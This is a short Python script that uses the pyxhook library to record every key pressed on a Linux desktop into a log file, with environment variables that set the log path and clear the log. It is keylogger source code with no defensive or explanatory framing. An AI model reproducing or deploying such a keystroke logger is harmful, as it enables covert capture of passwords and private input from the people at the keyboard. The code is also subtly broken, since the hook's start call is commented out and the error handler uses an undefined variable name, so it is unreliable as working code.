#!/usr/bin/env python3

import os
import pyxhook

log_file = os.environ.get(
        "pylogger_file",
        os.path.expanduser('~/dev/file.log')
        )
cancel_key = ord(
        os.environ.get(
            'pylogger_cancel',
            '`'
            )[0]
        )

#allow clearing the log file on start
if os.environ.get('pylogger_clean', None) is not None:
    try:
        os.remove(log_file)
    except:
        pass

def OnKeyPress(event):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.Key))

new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress
new_hook.HookKeyboard()

try:
    pass
    #new_hook.start()
except KeyboardInterrupt:
    pass
except Exception as ex:
    msg = 'Error catching events:\n {}'.format(ex)
    pyxhook.print_err(msg)
    with open(lof_file, 'a') as f:
        f.write('\n{}'.format(msg))

